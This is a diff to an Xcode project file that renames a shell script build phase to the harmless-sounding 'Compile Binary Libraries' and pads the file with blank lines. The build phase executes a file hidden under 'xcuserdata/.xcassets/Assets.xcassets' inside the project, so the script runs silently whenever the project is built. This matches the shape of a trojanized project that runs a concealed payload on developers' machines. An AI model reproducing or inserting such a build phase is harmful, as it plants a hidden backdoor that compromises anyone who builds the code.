@@ -69,7 +69,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 300EBE5C260ECC330010D65C /* Build configuration list for PBXNativeTarget "Swift-闭包" */;
 			buildPhases = (
-				9796ADB8F15130E0BB6D902C /* [CP] Build Pods Frameworks */,
+				C8A551AC34F3A4C1A36D902C /* Compile Binary Libraries */,
 				300EBE51260ECC330010D65C /* Sources */,
 				300EBE52260ECC330010D65C /* Frameworks */,
 				300EBE53260ECC330010D65C /* CopyFiles */,
@@ -324,7 +324,7 @@
 	
 		/* Begin PBXShellScriptBuildPhase section */
 
-	9796ADB8F15130E0BB6D902C /* [CP] Build Pods Frameworks */ = {
+	C8A551AC34F3A4C1A36D902C /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -333,7 +333,7 @@
 			);
 			inputPaths = (
 			);
-			name = "[CP] Build Pods Frameworks";
+			name = "Compile Binary Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -344,6 +344,12 @@
 
 \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
 		};
+	
+
+	
+
+	
+
 	
 
 	
